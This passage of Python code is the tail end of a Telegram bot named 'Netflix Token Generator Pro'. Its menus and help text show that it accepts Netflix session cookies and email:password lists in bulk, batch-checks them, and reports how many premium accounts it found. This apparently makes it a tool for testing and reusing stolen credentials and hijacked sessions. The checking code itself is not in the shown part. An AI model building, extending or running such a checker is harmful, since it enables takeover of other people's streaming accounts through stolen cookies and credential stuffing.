            await query.edit_message_text("📊 **Full Info Mode Activated**\n\nSend me cookies!", parse_mode=ParseMode.MARKDOWN)
        elif query.data == "batch":
            mode = context.user_data.get('mode', 'tokenonly')
            context.user_data['batch_mode'] = True
            await query.edit_message_text(
                f"📁 **Batch Mode Activated**\n"
                f"📊 **Mode:** `{mode}`\n\n"
                "Upload a .txt, .json, or .zip file, or send plain text (one item per line).\n"
                "Use /cancel to stop.",
                parse_mode=ParseMode.MARKDOWN
            )
        elif query.data == "stats":
            stats = self.stats.get_stats_summary()
            await query.edit_message_text(
                f"📊 **Bot Statistics**\n\n"
                f"👥 Users: `{stats['total_users']}`\n"
                f"✅ Checks: `{stats['total_checks']}`\n"
                f"📈 Success: `{stats['success_rate']:.1f}%`\n"
                f"💎 Premium: `{stats['premium_accounts']}`\n"
                f"⏱️ Uptime: `{stats['uptime']}`\n"
                f"⚡ Avg: `{stats['avg_response_time']:.2f}s`",
                parse_mode=ParseMode.MARKDOWN
            )
        elif query.data == "help":
            await query.edit_message_text(
                "❓ **Help**\n\n"
                "**Commands:**\n"
                "/start - Main menu\n"
                "/tokenonly - Fast token generation\n"
                "/fullinfo - Detailed account info\n"
                "/batch - Batch process files/text\n"
                "/stats - Bot statistics\n"
                "/cancel - Stop current task\n\n"
                "**Supported Formats:**\n"
                "• Netscape cookies\n"
                "• Raw cookie strings\n"
                "• JSON objects\n"
                "• Header strings\n"
                "• URL-encoded cookies\n"
                "• Email:Password\n"
                "• ZIP archives\n\n"
                "**Required Cookies:**\n"
                "• NetflixId\n"
                "• SecureNetflixId\n"
                "• nfvdid (optional)",
                parse_mode=ParseMode.MARKDOWN
            )
        elif query.data == "cancel":
            user_id = update.effective_user.id
            if user_id in self.active_tasks:
                self.active_tasks[user_id]['cancel'] = True
            await query.edit_message_text("🛑 Cancellation requested.", parse_mode=ParseMode.MARKDOWN)

    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        logging.error(f"Update {update} caused error {context.error}")
        try:
            if update and update.effective_message:
                error_msg = str(context.error)[:100] + "..."
                await update.effective_message.reply_text(
                    f"❌ An error occurred: `{error_msg}`\n\nPlease try again later.",
                    parse_mode=ParseMode.MARKDOWN
                )
        except:
            pass

    def run(self):
        if not TELEGRAM_AVAILABLE:
            print("=" * 60)
            print("🎬 Netflix Token Generator Pro v{}".format(BOT_VERSION))
            print("=" * 60)
            print("\n✅ Code verification complete!")
            print("   • Batch processing with live progress")
            print("   • Multi-threading enabled")
            print("   • Stats tracking active")
            print("\n📊 Bot would be running with these stats:")
            print(f"   • Users: {self.stats.get_stats_summary()['total_users']}")
            print(f"   • Success Rate: {self.stats.get_stats_summary()['success_rate']:.1f}%")
            print(f"   • Premium Found: {self.stats.get_stats_summary()['premium_accounts']}")
            print("\n🚀 To run with Telegram:")
            print("   pip install python-telegram-bot pytz pycountry")
            print("   python netflix_bot.py")
            return

        self.application = Application.builder().token(self.token).build()
        self.application.add_handler(CommandHandler("start", self.start))
        self.application.add_handler(CommandHandler("tokenonly", self.tokenonly))
        self.application.add_handler(CommandHandler("fullinfo", self.fullinfo))
        self.application.add_handler(CommandHandler("stats", self.stats_command))
        self.application.add_handler(CommandHandler("cancel", self.cancel))
        self.application.add_handler(CommandHandler("batch", self.batch_command))
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        self.application.add_handler(MessageHandler(filters.Document.ALL, self.handle_file))
        self.application.add_handler(CallbackQueryHandler(self.button_callback))
        self.application.add_error_handler(self.error_handler)

        print("=" * 60)
        print("🎬 Netflix Token Generator Pro v{} 🚀".format(BOT_VERSION))
        print("=" * 60)
        print(f"Release: {BOT_RELEASE_DATE}")
        print(f"Bot Token: {self.token[:10]}...")
        print(f"Max Threads: {MAX_THREADS}")
        print(f"Max File Size: {MAX_FILE_SIZE//1024//1024}MB")
        print(f"Request Timeout: {REQUEST_TIMEOUT}s")
        print(f"Cache Size: {CACHE_SIZE}")
        print("-" * 60)
        print("Bot is running... Press Ctrl+C to stop")
        print("=" * 60)

        try:
            self.application.run_polling(allowed_updates=Update.ALL_TYPES)
        except KeyboardInterrupt:
            print("\n👋 Shutting down...")
        except Exception as e:
            print(f"\n❌ Fatal error: {e}")
            logging.error(traceback.format_exc())

# ==================== MAIN ENTRY POINT ====================
if __name__ == '__main__':
    logging.basicConfig(
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.DEBUG if DEBUG_MODE else logging.INFO,
        handlers=[
            logging.FileHandler('netflix_bot.log'),
            logging.StreamHandler()
        ]
    )
    bot = NetflixTokenBot(TOKEN)
    bot.run()
